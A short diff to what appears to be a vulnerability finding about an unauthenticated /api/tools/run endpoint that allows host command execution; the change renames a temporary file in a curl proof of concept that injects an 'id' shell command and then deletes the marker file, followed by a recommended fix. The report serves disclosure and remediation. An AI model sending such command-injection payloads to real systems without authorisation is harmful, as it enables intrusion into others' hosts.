@@ -27,10 +27,10 @@ Impact: host command execution as the server user.
 PoC:
 
 ```bash
-curl -s http://127.0.0.1:8000/api/tools/run -d '{"cmd":"id > /tmp/finding-vetter-poc"}'
-test -f /tmp/finding-vetter-poc && rm /tmp/finding-vetter-poc
+curl -s http://127.0.0.1:8000/api/tools/run -d '{"cmd":"id > /tmp/verifymate-poc"}'
+test -f /tmp/verifymate-poc && rm /tmp/verifymate-poc
 ```
 
-Expected result: `/tmp/finding-vetter-poc` is created and then removed, demonstrating a safe side effect.
+Expected result: `/tmp/verifymate-poc` is created and then removed, demonstrating a safe side effect.
 
 Fix: require authentication and explicit user approval before invoking the tool, and replace shell execution with an allowlisted argv runner using `shell=False`.
